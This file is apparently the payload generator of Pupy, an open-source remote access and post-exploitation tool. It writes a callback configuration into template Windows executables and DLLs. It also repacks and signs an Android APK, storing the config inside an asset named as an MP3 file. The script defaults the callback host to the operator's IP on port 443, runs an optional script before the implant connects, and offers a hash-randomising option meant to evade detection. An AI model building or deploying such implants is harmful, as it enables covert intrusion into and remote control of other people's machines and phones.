#!/usr/bin/env python
# -*- coding: UTF8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

import logging
import argparse
import sys
import os.path
import re
import shlex
import random
import string
import zipfile
import tarfile
import tempfile
import shutil
import subprocess
import traceback
from pupylib.utils.network import get_local_ip
from network.conf import transports, launchers
from network.base_launcher import LauncherError

def get_edit_pupyx86_dll(conf):
	return get_edit_binary(os.path.join("payload_templates","pupyx86.dll"), conf)

def get_edit_pupyx64_dll(conf):
	return get_edit_binary(os.path.join("payload_templates","pupyx64.dll"), conf)

def get_edit_pupyx86_exe(conf):
	return get_edit_binary(os.path.join("payload_templates","pupyx86.exe"), conf)

def get_edit_pupyx64_exe(conf):
	return get_edit_binary(os.path.join("payload_templates","pupyx64.exe"), conf)

def get_edit_binary(path, conf):
	logging.debug("generating binary %s with conf: %s"%(path, conf))
	binary=b""
	with open(path, 'rb') as f:
		binary=f.read()
	i=0
	offsets=[]
	while True:
		i=binary.find("####---PUPY_CONFIG_COMES_HERE---####\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", i+1)
		if i==-1:
			break
		offsets.append(i)

	if not offsets:
		raise Exception("Error: the offset to edit the config have not been found")
	elif len(offsets)!=1:
		raise Exception("Error: multiple offsets to edit the config have been found")

	new_conf=get_raw_conf(conf)
	new_conf+="\n\x00\x00\x00\x00\x00\x00\x00\x00"
	if len(new_conf)>4092:
		raise Exception("Error: config or offline script too long\nYou need to recompile the dll with a bigger buffer")
	binary=binary[0:offsets[0]]+new_conf+binary[offsets[0]+len(new_conf):]
	return binary

def get_raw_conf(conf):
	if not "offline_script" in conf:
		offline_script=""
	else:
		offline_script=conf["offline_script"]
	new_conf=""
	new_conf+="LAUNCHER=%s\n"%(repr(conf['launcher']))
	new_conf+="LAUNCHER_ARGS=%s\n"%(repr(conf['launcher_args']))
	new_conf+=offline_script
	new_conf+="\n"
	return new_conf


def updateZip(zipname, filename, data):
	# generate a temp file
	tmpfd, tmpname = tempfile.mkstemp(dir=os.path.dirname(zipname))
	os.close(tmpfd)

	# create a temp copy of the archive without filename			
	with zipfile.ZipFile(zipname, 'r') as zin:
		with zipfile.ZipFile(tmpname, 'w') as zout:
			zout.comment = zin.comment # preserve the comment
			for item in zin.infolist():
				if item.filename != filename:
					zout.writestr(item, zin.read(item.filename))

	# replace with the temp archive
	os.remove(zipname)
	os.rename(tmpname, zipname)

	# now add filename with its new data
	with zipfile.ZipFile(zipname, mode='a', compression=zipfile.ZIP_DEFLATED) as zf:
		zf.writestr(filename, data)

def updateTar(arcpath, arcname, file_path):
	tempdir=tempfile.mkdtemp(prefix="tmp_pupy_")
	try:
		with tarfile.open(arcpath, 'r') as tfr:
			names=tfr.getnames()
			tfr.extractall(tempdir)
			with tarfile.open(arcpath+"2", 'w:gz') as tfw:
				for n in names:
					#print "adding %s"%n
					if n!=arcname:
						tfw.add(os.path.join(tempdir, n), arcname=n, recursive=False)
					else:
						tfw.add(file_path, arcname=n, recursive=False)
		shutil.copy(arcpath+"2", arcpath)
	finally:
		shutil.rmtree(tempdir)

def get_edit_apk(path, new_path, conf):
	tempdir=tempfile.mkdtemp(prefix="tmp_pupy_")
	try:
		new_conf=get_raw_conf(conf)
		shutil.copy(path, new_path)

		#extracting the python-for-android install tar from the apk
		zf=zipfile.ZipFile(path,'r')
		zf.extract("assets/private.mp3", tempdir)
		zf.close()

		with open(os.path.join(tempdir,"pp.conf"),'w') as w:
			w.write(new_conf)

		print "[+] packaging the apk ... (can take a 10-20 seconds)"
		#updating the tar with the new config
		updateTar(os.path.join(tempdir,"assets/private.mp3"), "service/pp.conf", os.path.join(tempdir,"pp.conf"))
		#repacking the tar in the apk
		with open(os.path.join(tempdir,"assets/private.mp3"), 'r') as t:
			updateZip(new_path, "assets/private.mp3", t.read())
		
		#signing the tar
		res=subprocess.check_output("jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore crypto/pupy-apk-release-key.keystore -storepass pupyp4ssword -tsa http://timestamp.digicert.com '%s' pupy_key"%new_path, shell=True)
		print(res)
	finally:
		#cleaning up
		shutil.rmtree(tempdir, ignore_errors=True)


if __name__=="__main__":
	parser = argparse.ArgumentParser(description='Process some integers.')
	parser.add_argument('-t', '--type', default='exe_x86', choices=['apk','exe_x86','exe_x64','dll_x86','dll_x64'], help="(default: exe_x86)")
	parser.add_argument('-o', '--output', help="output path")
	parser.add_argument('-s', '--offline-script', help="offline python script to execute before starting the connection")
	parser.add_argument('--randomize-hash', action='store_true', help="add a random string in the exe to make it's hash unknown")
	parser.add_argument('launcher', choices=[x for x in launchers.iterkeys()], default='auto_proxy', help="Choose a launcher. Launchers make payloads behave differently at startup.")
	parser.add_argument('launcher_args', nargs=argparse.REMAINDER, help="launcher options")

	args=parser.parse_args()
	l=launchers[args.launcher]()
	while True:
		try:
			l.parse_args(args.launcher_args)
		except LauncherError as e:
			if str(e).strip().endswith("--host is required") and not "--host" in args.launcher_args:
				myip=get_local_ip()
				if not myip:
					sys.exit("[-] --host parameter missing and couldn't find your local IP. You must precise an ip or a fqdn manually")
				print("[!] required argument missing, automatically adding parameter --host %s:443 from local ip address"%myip)
				args.launcher_args.insert(0,"%s:443"%myip)
				args.launcher_args.insert(0,"--host")
			else:
				l.arg_parser.print_usage()
				exit(str(e))
		else:
			break
	script_code=""
	if args.offline_script:
		with open(args.offline_script,'r') as f:
			script_code=f.read()
	if args.randomize_hash:
		script_code+="\n#%s\n"%''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(40))
	conf={}
	conf['launcher']=args.launcher
	conf['launcher_args']=args.launcher_args
	conf['offline_script']=script_code

	outpath=args.output
	if args.type=="exe_x86":
		binary=get_edit_pupyx86_exe(conf)
		if not outpath:
			outpath="pupyx86.exe"
		with open(outpath, 'wb') as w:
			w.write(binary)
	elif args.type=="exe_x64":
		binary=get_edit_pupyx64_exe(conf)
		if not outpath:
			outpath="pupyx64.exe"
		with open(outpath, 'wb') as w:
			w.write(binary)
	elif args.type=="dll_x64":
		binary=get_edit_pupyx64_dll(conf)
		if not outpath:
			outpath="pupyx64.dll"
		with open(outpath, 'wb') as w:
			w.write(binary)
	elif args.type=="dll_x86":
		binary=get_edit_pupyx86_dll(conf)
		if not outpath:
			outpath="pupyx86.dll"
		with open(outpath, 'wb') as w:
			w.write(binary)
	elif args.type=="apk":
		if not outpath:
			outpath="pupy.apk"
		get_edit_apk(os.path.join("payload_templates","pupy.apk"), outpath, conf)
	else:
		exit("Type %s is invalid."%(args.type))
	print("binary generated with config :")
	print("OUTPUT_PATH = %s"%os.path.abspath(outpath))
	print("LAUNCHER = %s"%repr(args.launcher))
	print("LAUNCHER_ARGS = %s"%repr(args.launcher_args))
	print("OFFLINE_SCRIPT = %s"%args.offline_script)






